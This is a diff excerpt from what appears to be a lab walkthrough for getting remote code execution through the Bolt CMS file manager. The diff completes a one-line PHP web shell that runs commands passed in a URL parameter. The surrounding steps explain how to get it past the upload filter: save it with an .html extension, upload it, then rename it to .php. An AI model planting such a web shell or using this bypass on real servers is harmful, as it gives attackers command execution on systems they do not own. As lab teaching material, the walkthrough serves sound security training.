@@ -20,7 +20,7 @@ Step 3. The deck shows a successful login as the admin user. Use the current lab
 Weaponizing the file manager
 Step 4. After logging in, open File Management in the left navigation menu.
 Step 5. Prepare a simple one-parameter web shell locally.
-<?php echo system($_GET[
+<?php echo system($_GET['cmd']); ?>
 Step 6. Save that file as rce.html, not rce.php. The upload form blocks PHP extensions but allows HTML.
 Step 7. Upload rce.html through the Bolt file manager. The deck shows the upload succeeding once the file uses the .html extension.
 Step 8. Click the uploaded file so Bolt opens it in the editor. From the Options menu, rename rce.html to rce.php.
